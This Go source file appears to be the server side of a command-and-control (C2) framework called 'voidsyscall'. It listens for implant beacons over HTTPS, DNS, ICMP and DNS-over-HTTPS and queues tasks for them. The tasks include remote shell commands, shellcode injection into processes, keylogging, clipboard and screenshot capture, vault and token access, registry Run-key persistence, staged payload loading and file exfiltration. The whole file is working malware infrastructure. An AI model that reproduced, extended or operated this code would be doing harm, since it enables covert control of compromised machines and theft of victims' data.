package server

import (
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/VoidSecSoftwares/voidsyscall/channels"
	"github.com/VoidSecSoftwares/voidsyscall/crypto"
)

type Server struct {
	sessions       *SessionManager
	config         *ServerConfig
	ctx            context.Context
	cancel         context.CancelFunc
	downloads      map[[16]byte]string
	dlMu           sync.Mutex
	screenshots    map[[16]byte]string
	shotsMu        sync.Mutex
	screenshotsDir string
}

type ServerConfig struct {
	HTTPAddr   string
	HTTPSPort  int
	DNSAddr    string
	DNSPort    int
	ICMPAddr   string
	ICMPPort   int
	DoHAddr    string
	DoHURL     string
	BeaconPath string
	CertFile   string
	KeyFile    string
	LogFile    string
	WebAddr    string
	StateFile  string
}

type TaskType uint8

const (
	TaskShell       TaskType = 0x01
	TaskInject      TaskType = 0x02
	TaskPatch       TaskType = 0x03
	TaskSleep       TaskType = 0x04
	TaskDownload    TaskType = 0x05
	TaskUpload      TaskType = 0x06
	TaskRotateKey   TaskType = 0x07
	TaskStage       TaskType = 0x08
	TaskExit        TaskType = 0xFF
	TaskEvasion     TaskType = 0x10
	TaskHandles     TaskType = 0x11
	TaskVault       TaskType = 0x12
	TaskFingerprint TaskType = 0x13
	TaskToken       TaskType = 0x14
	TaskProcs       TaskType = 0x15
	TaskKillProc    TaskType = 0x16
	TaskPersist     TaskType = 0x17
	TaskScreenshot  TaskType = 0x18
	TaskKeylog      TaskType = 0x19
	TaskClipboard   TaskType = 0x1A
)

func taskTypeName(t TaskType) string {
	switch t {
	case TaskShell:
		return "shell"
	case TaskInject:
		return "inject"
	case TaskPatch:
		return "patch"
	case TaskSleep:
		return "sleep"
	case TaskDownload:
		return "download"
	case TaskUpload:
		return "upload"
	case TaskRotateKey:
		return "rotate"
	case TaskStage:
		return "stage"
	case TaskEvasion:
		return "evasion"
	case TaskHandles:
		return "handles"
	case TaskVault:
		return "vault"
	case TaskFingerprint:
		return "fingerprint"
	case TaskToken:
		return "token"
	case TaskProcs:
		return "procs"
	case TaskKillProc:
		return "killproc"
	case TaskPersist:
		return "persist"
	case TaskScreenshot:
		return "shot"
	case TaskKeylog:
		return "keylog"
	case TaskClipboard:
		return "clipboard"
	case TaskExit:
		return "exit"
	default:
		return "unknown"
	}
}

func NewServer(cfg *ServerConfig) *Server {
	ctx, cancel := context.WithCancel(context.Background())
	shotsDir := "screenshots"
	_ = os.MkdirAll(shotsDir, 0700)
	return &Server{
		sessions:       NewSessionManager(),
		config:         cfg,
		ctx:            ctx,
		cancel:         cancel,
		downloads:      make(map[[16]byte]string),
		screenshots:    make(map[[16]byte]string),
		screenshotsDir: shotsDir,
	}
}

func (s *Server) Run() error {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.SetOutput(os.Stdout)

	if s.config.StateFile != "" {
		if err := s.LoadState(s.config.StateFile); err != nil {
			log.Printf("%s[-] State load: %v%s", AnsiRed, err, AnsiReset)
		}
	}

	log.Printf("%s[+] voidsyscall C2 starting%s", AnsiGreen, AnsiReset)
	log.Printf("%s[+] HTTP:%s %s%s:%d%s", AnsiGreen, AnsiReset, AnsiCyan, s.config.HTTPAddr, s.config.HTTPSPort, AnsiReset)
	log.Printf("%s[+] DNS:%s %s%s:%d%s", AnsiGreen, AnsiReset, AnsiCyan, s.config.DNSAddr, s.config.DNSPort, AnsiReset)
	log.Printf("%s[+] ICMP:%s %s%s", AnsiGreen, AnsiReset, AnsiCyan, s.config.ICMPAddr)
	if s.config.DoHAddr != "" && s.config.DoHURL != "" {
		log.Printf("%s[+] DoH:%s %s%s%s", AnsiGreen, AnsiReset, AnsiCyan, s.config.DoHAddr, AnsiReset)
	}

	go s.startHTTPServer()
	go s.startDNSServer()
	go s.startICMPServer()
	go s.startDOHServer()
	s.startWebUI()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	<-sigChan
	log.Printf("%s[!] Shutting down...%s", AnsiYellow, AnsiReset)
	s.cancel()
	if s.config.StateFile != "" {
		if err := s.SaveState(s.config.StateFile); err != nil {
			log.Printf("%s[-] State save: %v%s", AnsiRed, err, AnsiReset)
		} else {
			log.Printf("%s[+] State saved to %s%s", AnsiGreen, s.config.StateFile, AnsiReset)
		}
	}
	time.Sleep(1 * time.Second)
	return nil
}

func (s *Server) startHTTPServer() {
	httpCfg := &channels.Config{
		HTTPAddr:   s.config.HTTPAddr,
		HTTPSPort:  s.config.HTTPSPort,
		BeaconPath: s.config.BeaconPath,
		JitterMin:  0,
		JitterMax:  0,
	}

	ch, err := channels.New(channels.ChannelHTTPS, httpCfg)
	if err != nil {
		log.Printf("%s[-] HTTP channel error: %v%s", AnsiRed, err, AnsiReset)
		return
	}

	type tlsListener interface {
		ListenWithTLS(ctx context.Context, addr, certFile, keyFile string, handler func(*channels.Message) *channels.Message) error
	}

	if tlsCh, ok := ch.(tlsListener); ok {
		err = tlsCh.ListenWithTLS(s.ctx, fmt.Sprintf("%s:%d", s.config.HTTPAddr, s.config.HTTPSPort),
			s.config.CertFile, s.config.KeyFile, s.handleMessage)
	} else {
		err = ch.Listen(s.ctx, fmt.Sprintf("%s:%d", s.config.HTTPAddr, s.config.HTTPSPort), s.handleMessage)
	}
	if err != nil && err != http.ErrServerClosed {
		log.Printf("%s[-] HTTP listen error: %v%s", AnsiRed, err, AnsiReset)
	}
}

func (s *Server) startDNSServer() {
	dnsCfg := &channels.Config{
		DNSAddr:   s.config.DNSAddr,
		DNSPort:   s.config.DNSPort,
		JitterMin: 0,
		JitterMax: 0,
	}

	ch, err := channels.New(channels.ChannelDNS, dnsCfg)
	if err != nil {
		log.Printf("%s[-] DNS channel error: %v%s", AnsiRed, err, AnsiReset)
		return
	}

	addr := fmt.Sprintf("%s:%d", s.config.DNSAddr, s.config.DNSPort)
	err = ch.Listen(s.ctx, addr, s.handleMessage)
	if err != nil {
		log.Printf("%s[-] DNS listen error: %v%s", AnsiRed, err, AnsiReset)
	}
}

func (s *Server) startICMPServer() {
	icmpCfg := &channels.Config{
		ICMPAddr:  s.config.ICMPAddr,
		ICMPPort:  s.config.ICMPPort,
		JitterMin: 0,
		JitterMax: 0,
	}

	ch, err := channels.New(channels.ChannelICMP, icmpCfg)
	if err != nil {
		log.Printf("%s[-] ICMP channel error: %v%s", AnsiRed, err, AnsiReset)
		return
	}

	addr := fmt.Sprintf("%s", s.config.ICMPAddr)
	err = ch.Listen(s.ctx, addr, s.handleMessage)
	if err != nil {
		log.Printf("%s[-] ICMP listen error: %v%s", AnsiRed, err, AnsiReset)
	}
}

func (s *Server) startDOHServer() {
	if s.config.DoHAddr == "" {
		return
	}
	dohCfg := &channels.Config{
		DoHURL:     s.config.DoHURL,
		DoHDomain:  "voidsec.local",
		JitterMin:  0,
		JitterMax:  0,
		UserAgent:  "voidsyscall/1.0",
		TimeoutSec: 10,
	}

	ch, err := channels.New(channels.ChannelDoH, dohCfg)
	if err != nil {
		log.Printf("%s[-] DoH channel error: %v%s", AnsiRed, err, AnsiReset)
		return
	}

	type tlsListener interface {
		ListenWithTLS(ctx context.Context, addr, certFile, keyFile string, handler func(*channels.Message) *channels.Message) error
	}

	if s.config.CertFile != "" && s.config.KeyFile != "" {
		if tlsCh, ok := ch.(tlsListener); ok {
			err = tlsCh.ListenWithTLS(s.ctx, s.config.DoHAddr, s.config.CertFile, s.config.KeyFile, s.handleMessage)
		} else {
			err = ch.Listen(s.ctx, s.config.DoHAddr, s.handleMessage)
		}
	} else {
		err = ch.Listen(s.ctx, s.config.DoHAddr, s.handleMessage)
	}
	if err != nil && err != http.ErrServerClosed {
		log.Printf("%s[-] DoH listen error: %v%s", AnsiRed, err, AnsiReset)
	}
}

func (s *Server) handleMessage(msg *channels.Message) *channels.Message {
	session := s.sessions.GetOrCreate(msg.ID, nil, "unknown")

	hexID := fmt.Sprintf("%x", msg.ID[:8])
	if msg.Type == 0x01 {
		log.Printf("%s[*] Beacon %s%s%s (%s%s%s)%s",
			AnsiBlue, AnsiReset, AnsiMagenta, hexID, AnsiReset, AnsiCyan, session.Channel, AnsiReset)

		// Refill the queue from due schedules before handing out a task.
		now := time.Now()
		for _, t := range session.DueSchedules(now) {
			id := makeTaskID()
			task := &Task{Type: t.Type, Data: t.Data}
			copy(task.ID[:], id[:])
			session.EnqueueTask(task)
			session.RecordTask(id)
		}

		// Beacon — check for queued tasks
		task := session.DequeueTask()
		if task == nil {
			// No task, send sleep
			return &channels.Message{
				Type: 0x01,
				Data: []byte{0x04, 0x00, 0x00, 0x00, 0x00}, // TaskSleep, 0 seconds
			}
		}

		return &channels.Message{
			Type: 0x01,
			Data: append([]byte{task.Type}, task.Data...),
		}
	}

	if msg.Type == 0x02 {
		// Result
		if len(msg.Data) < 1 {
			return nil
		}
		status := msg.Data[0]
		output := msg.Data[1:]

		result := &Result{
			Status: status,
			Output: output,
		}
		copy(result.TaskID[:], msg.ID[:])
		session.AddResult(result)

		elapsed := session.TaskElapsed(result.TaskID)
		elapsedStr := ""
		if elapsed > 0 {
			elapsedStr = fmt.Sprintf(" (%.1fs)", elapsed.Seconds())
		}

		// Staged download: route bytes to a local file instead of the log.
		s.dlMu.Lock()
		localPath, isDownload := s.downloads[result.TaskID]
		delete(s.downloads, result.TaskID)
		s.dlMu.Unlock()
		if isDownload {
			if status == 0 && len(output) > 0 {
				if err := os.WriteFile(localPath, output, 0644); err != nil {
					log.Printf("%s[-] Download to %s failed: %v%s", AnsiRed, localPath, err, AnsiReset)
				} else {
					log.Printf("%s[+] Downloaded %d bytes -> %s%s%s",
						AnsiGreen, len(output), AnsiCyan, localPath, AnsiReset)
				}
			} else {
				log.Printf("%s[-] Download from %x failed (status=%d)%s", AnsiRed, hexID, status, AnsiReset)
			}
		}

		// Screenshot: write the raw BMP to the shots directory.
		s.shotsMu.Lock()
		shotPath, isShot := s.screenshots[result.TaskID]
		delete(s.screenshots, result.TaskID)
		s.shotsMu.Unlock()
		if isShot {
			if status == 0 && len(output) > 0 {
				if err := os.WriteFile(shotPath, output, 0644); err != nil {
					log.Printf("%s[-] Screenshot to %s failed: %v%s", AnsiRed, shotPath, err, AnsiReset)
				} else {
					log.Printf("%s[+] Screenshot %d bytes -> %s%s%s",
						AnsiGreen, len(output), AnsiCyan, shotPath, AnsiReset)
				}
			} else {
				log.Printf("%s[-] Screenshot failed (status=%d)%s", AnsiRed, status, AnsiReset)
			}
		}

		statusColor := AnsiGreen
		if status != 0 {
			statusColor = AnsiRed
		}
		log.Printf("%s[+] Result from %s%s%s %sstatus=%d %s%s%s",
			AnsiGreen, AnsiMagenta, hexID, AnsiReset,
			statusColor, status, AnsiYellow, elapsedStr, AnsiReset)
		if len(output) > 0 && !isDownload && !isShot {
			if len(output) > 512 {
				log.Printf("%s[%d bytes]%s", AnsiDim, len(output), AnsiReset)
			} else {
				log.Printf("%s", string(output))
			}
		}

		return &channels.Message{Type: 0x02, Data: []byte{0x00}}
	}

	return nil
}

func makeTaskID() [16]byte {
	var id [16]byte
	for i := range id {
		id[i] = byte(time.Now().UnixNano() >> uint(i*8))
	}
	return id
}

func (s *Server) EnqueueTask(sessionID [16]byte, taskType TaskType, data []byte) error {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return fmt.Errorf("session %x not found", sessionID[:8])
	}

	taskID := makeTaskID()

	task := &Task{
		Type: uint8(taskType),
		Data: data,
	}
	copy(task.ID[:], taskID[:])

	session.EnqueueTask(task)
	session.RecordTask(taskID)
	log.Printf(
		"%s[+] Task queued for %s%x%s type=%d%s",
		AnsiGreen,
		AnsiReset, sessionID[:8],
		AnsiReset, taskType,
		AnsiReset,
	)
	return nil
}

func (s *Server) GetSession(id [16]byte) (*Session, bool) {
	return s.sessions.Get(id)
}

func (s *Server) AllSessions() []*Session {
	return s.sessions.All()
}

func (s *Server) ListSessions() string {
	sessions := s.sessions.All()
	if len(sessions) == 0 {
		return "No active sessions"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Active sessions: %d\n", len(sessions)))
	for _, sess := range sessions {
		sb.WriteString(fmt.Sprintf("  [%x] channel=%s last=%s tasks=%d results=%d\n",
			sess.ID[:8],
			sess.Channel,
			sess.LastBeacon.Format(time.RFC3339),
			len(sess.Queue),
			len(sess.Results),
		))
	}
	return sb.String()
}

func (s *Server) RunShell(sessionID [16]byte, cmd string) error {
	data := []byte(cmd)
	return s.EnqueueTask(sessionID, TaskShell, data)
}

func (s *Server) RunInject(sessionID [16]byte, pid uint32, shellcode []byte) error {
	data := make([]byte, 4+len(shellcode))
	binary.LittleEndian.PutUint32(data[:4], pid)
	copy(data[4:], shellcode)
	return s.EnqueueTask(sessionID, TaskInject, data)
}

func (s *Server) PatchTarget(sessionID [16]byte, patchType byte) error {
	return s.EnqueueTask(sessionID, TaskPatch, []byte{patchType})
}

func (s *Server) StopSession(sessionID [16]byte) error {
	return s.EnqueueTask(sessionID, TaskExit, nil)
}

func (s *Server) RunEvasion(sessionID [16]byte, sub byte) error {
	return s.EnqueueTask(sessionID, TaskEvasion, []byte{sub})
}

func (s *Server) RunHandles(sessionID [16]byte, sub byte) error {
	return s.EnqueueTask(sessionID, TaskHandles, []byte{sub})
}

func (s *Server) RunToken(sessionID [16]byte, sub byte) error {
	return s.EnqueueTask(sessionID, TaskToken, []byte{sub})
}

func (s *Server) RunVault(sessionID [16]byte, sub byte) error {
	return s.EnqueueTask(sessionID, TaskVault, []byte{sub})
}

func (s *Server) RunFingerprint(sessionID [16]byte) error {
	return s.EnqueueTask(sessionID, TaskFingerprint, nil)
}

// RunDownload queues a remote file fetch. When the result comes back the
// server routes the raw bytes into the local path instead of the log.
func (s *Server) RunDownload(sessionID [16]byte, remotePath, localPath string) error {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return fmt.Errorf("session %x not found", sessionID[:8])
	}
	taskID := makeTaskID()
	task := &Task{Type: uint8(TaskDownload), Data: []byte(remotePath)}
	copy(task.ID[:], taskID[:])
	session.EnqueueTask(task)
	session.RecordTask(taskID)

	s.dlMu.Lock()
	s.downloads[taskID] = localPath
	s.dlMu.Unlock()

	return nil
}

// RunScreenshot queues a screen capture. The BMP bytes arriving in the
// result are routed into screenshots/<task-hex>.bmp.
func (s *Server) RunScreenshot(sessionID [16]byte) error {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return fmt.Errorf("session %x not found", sessionID[:8])
	}
	taskID := makeTaskID()
	task := &Task{Type: uint8(TaskScreenshot)}
	copy(task.ID[:], taskID[:])
	session.EnqueueTask(task)
	session.RecordTask(taskID)

	s.shotsMu.Lock()
	s.screenshots[taskID] = fmt.Sprintf("%s%x.bmp", s.screenshotsDir+string(os.PathSeparator), taskID[:8])
	s.shotsMu.Unlock()
	return nil
}

// RunKeylog controls the agent keylogger: 1=start, 2=stop, 3=dump.
func (s *Server) RunKeylog(sessionID [16]byte, sub byte) error {
	return s.EnqueueTask(sessionID, TaskKeylog, []byte{sub})
}

// RunClipboard pulls the current clipboard CF_UNICODETEXT.
func (s *Server) RunClipboard(sessionID [16]byte) error {
	return s.EnqueueTask(sessionID, TaskClipboard, nil)
}

// RunPersist registers the agent image in the current user's Run key.
func (s *Server) RunPersist(sessionID [16]byte, valueName string) error {
	return s.EnqueueTask(sessionID, TaskPersist, []byte(valueName))
}

// RunUpload queues a file write on the target. Wire format:
// uint16 LE pathLen | path | payload.
func (s *Server) RunUpload(sessionID [16]byte, remotePath string, payload []byte) error {
	data := make([]byte, 0, 2+len(remotePath)+len(payload))
	var pathLen [2]byte
	binary.LittleEndian.PutUint16(pathLen[:], uint16(len(remotePath)))
	data = append(data, pathLen[:]...)
	data = append(data, []byte(remotePath)...)
	data = append(data, payload...)
	return s.EnqueueTask(sessionID, TaskUpload, data)
}

// RotateKey rolls a fresh per-session AES key and ships it to the agent.
func (s *Server) RotateKey(sessionID [16]byte) error {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return fmt.Errorf("session %x not found", sessionID[:8])
	}
	newKey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("generate key: %w", err)
	}
	session.Key = newKey
	return s.EnqueueTask(sessionID, TaskRotateKey, newKey)
}

func (s *Server) RunListProcs(sessionID [16]byte) error {
	return s.EnqueueTask(sessionID, TaskProcs, nil)
}

func (s *Server) KillProcess(sessionID [16]byte, pid uint32) error {
	data := make([]byte, 4)
	binary.LittleEndian.PutUint32(data, pid)
	return s.EnqueueTask(sessionID, TaskKillProc, data)
}

// Schedule adds a recurring shell command; it fires on every beacon pass
// once the interval elapses.
func (s *Server) Schedule(sessionID [16]byte, intervalSeconds int, command string) error {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return fmt.Errorf("session %x not found", sessionID[:8])
	}
	if intervalSeconds <= 0 {
		return fmt.Errorf("interval must be > 0")
	}
	session.AddSchedule(uint8(TaskShell), []byte(command), time.Duration(intervalSeconds)*time.Second)
	return nil
}

func (s *Server) Unschedule(sessionID [16]byte) error {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return fmt.Errorf("session %x not found", sessionID[:8])
	}
	session.ClearSchedules()
	return nil
}

// Stage splits a payload into chunks and queues them as staged-loader tasks.
// The final chunk carries the last-flag; the agent reassembles and self-injects.
func (s *Server) Stage(sessionID [16]byte, payload []byte) error {
	if len(payload) == 0 {
		return fmt.Errorf("empty payload")
	}
	const chunkSize = 24576
	var offset int
	for {
		end := offset + chunkSize
		if end > len(payload) {
			end = len(payload)
		}
		chunk := payload[offset:end]
		last := byte(0)
		if end == len(payload) {
			last = 1
		}
		data := make([]byte, 0, 1+len(chunk))
		data = append(data, last)
		data = append(data, chunk...)
		if err := s.EnqueueTask(sessionID, TaskStage, data); err != nil {
			return err
		}
		if end == len(payload) {
			break
		}
		offset = end
	}
	return nil
}

func (s *Server) ListResults(sessionID [16]byte) (string, error) {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return "", fmt.Errorf("session %x not found", sessionID[:8])
	}
	results := session.PeekResults()
	var sb strings.Builder
	if len(results) == 0 {
		sb.WriteString("No results stored\n")
		return sb.String(), nil
	}
	for _, r := range results {
		sb.WriteString(fmt.Sprintf("  task %x status=%d bytes=%d\n", r.TaskID[:8], r.Status, len(r.Output)))
	}
	return sb.String(), nil
}

func (s *Server) ListQueue(sessionID [16]byte) (string, error) {
	session, ok := s.sessions.Get(sessionID)
	if !ok {
		return "", fmt.Errorf("session %x not found", sessionID[:8])
	}
	tasks := session.PeekQueue()
	var sb strings.Builder
	if len(tasks) == 0 {
		sb.WriteString("Queue empty\n")
		return sb.String(), nil
	}
	for _, t := range tasks {
		sb.WriteString(fmt.Sprintf("  [%x] %s (%d bytes)\n", t.ID[:8], taskTypeName(TaskType(t.Type)), len(t.Data)))
	}
	for _, sch := range session.ShowSchedules() {
		sb.WriteString(fmt.Sprintf("  sched %s every %ds next=%s\n",
			taskTypeName(TaskType(sch.Type)), int(sch.Interval.Seconds()),
			sch.NextRun.Format(time.RFC3339)))
	}
	return sb.String(), nil
}
